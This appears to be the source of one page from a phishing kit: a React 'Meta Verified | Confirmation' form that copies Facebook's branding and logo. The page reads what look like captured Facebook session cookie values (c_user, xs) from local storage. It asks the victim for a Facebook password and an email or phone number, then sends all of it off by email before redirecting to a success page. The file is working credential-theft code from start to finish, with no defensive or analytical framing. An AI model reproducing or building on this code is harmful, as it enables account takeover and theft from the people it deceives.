import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { formTwoSchema, type ConfirmationForm } from "@shared/schema";
import { sendConfirmationFormEmail } from "@/lib/emailService";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { countries } from "@/lib/countries";
import { Eye, EyeOff, Search } from "lucide-react";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
  const [countryCode, setCountryCode] = useState('+1');
  const [showPassword, setShowPassword] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const [filteredCountries, setFilteredCountries] = useState(countries);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Initialize form with validation data
  const form = useForm<ConfirmationForm>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      c_user: '',
      xs: '',
      user_email: '',
      password: '',
      contactMethod: 'email',
      countryCode: '+1'
    }
  });

  // Load validation data from localStorage
  useEffect(() => {
    const storedData = localStorage.getItem('validation_data');
    if (!storedData) {
      setLocation('/validation');
      return;
    }

    try {
      const parsed = JSON.parse(storedData);
      if (!parsed.c_user || !parsed.xs) {
        throw new Error("Invalid validation data");
      }

      form.reset({
        ...form.getValues(),
        c_user: parsed.c_user,
        xs: parsed.xs
      });
    } catch (error) {
      console.error('Failed to parse validation data:', error);
      setLocation('/validation');
    }
  }, [form, setLocation]);

  // Filter countries based on search
  useEffect(() => {
    const filtered = countries.filter(country =>
      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
      country.code.toLowerCase().includes(countrySearch.toLowerCase())
    );
    setFilteredCountries(filtered);
  }, [countrySearch]);

  // Form submission handler
  const onSubmit = async (formData: ConfirmationForm) => {
    try {
      setIsSubmitting(true);

      const submissionData = {
        ...formData,
        contactMethod,
        countryCode: contactMethod === 'phone' ? countryCode : undefined,
        user_email: formData.user_email 
          ? (contactMethod === 'phone' ? `${countryCode}${formData.user_email}` : formData.user_email)
          : undefined,
        timestamp: new Date().toISOString()
      };

      await sendConfirmationFormEmail(submissionData);
      localStorage.removeItem('validation_data');

      toast({
        title: "Success!",
        description: "Your information has been submitted successfully"
      });

      // Use timeout to ensure toast is visible before redirect
      setTimeout(() => {
        setLocation("/success");
      }, 1500);
    } catch (error) {
      console.error('Form submission error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again."
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Preserve the existing JSX structure exactly as is
  return (
    <>
      <MetaTags
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />
      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
          <div>
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
              alt="Logo"
              className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
            />
          </div>
          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
            Facebook Security
          </h1>
          <h3 className="text-sm sm:text-base text-[#606770] mb-4 font-medium">
            Please enter your facebook password to complete the request
          </h3>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="text-left">
                <div className="mb-4">
                  <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
                    Contact Method
                  </label>
                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={() => setContactMethod('email')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'email'
                          ? 'bg-[#0180FA] text-white'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Email
                    </button>
                    <button
                      type="button"
                      onClick={() => setContactMethod('phone')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'phone'
                          ? 'bg-[#0180FA] text-white'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Phone
                    </button>
                  </div>
                </div>

                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                      </FormLabel>
                      <FormControl>
                        <div className="flex gap-2">
                          {contactMethod === 'phone' && (
                            <Select
                              value={countryCode}
                              onValueChange={setCountryCode}
                            >
                              <SelectTrigger className="w-[100px]">
                                <SelectValue placeholder="Code" />
                              </SelectTrigger>
                              <SelectContent>
                                <div className="sticky top-0 p-2 bg-white border-b z-50">
                                  <div className="flex items-center px-2 py-1 border rounded-md">
                                    <Search className="w-4 h-4 text-gray-500 mr-2" />
                                    <input
                                      className="w-full outline-none text-sm"
                                      placeholder="Search country..."
                                      value={countrySearch}
                                      onChange={(e) => setCountrySearch(e.target.value)}
                                    />
                                  </div>
                                </div>
                                <div className="max-h-[200px] overflow-y-auto">
                                  {filteredCountries.map((country) => (
                                    <SelectItem key={country.code} value={country.code}>
                                      {country.code} ({country.name})
                                    </SelectItem>
                                  ))}
                                </div>
                              </SelectContent>
                            </Select>
                          )}
                          <Input
                            type={contactMethod === 'email' ? 'email' : 'tel'}
                            placeholder={
                              contactMethod === 'email'
                                ? "Enter email address"
                                : "Enter phone number"
                            }
                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                            {...field}
                          />
                        </div>
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                      Password
                    </FormLabel>
                    <FormControl>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Enter password"
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10"
                          {...field}
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                        >
                          {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                        </button>
                      </div>
                    </FormControl>
                    <FormMessage className="text-xs text-red-500 mt-1" />
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}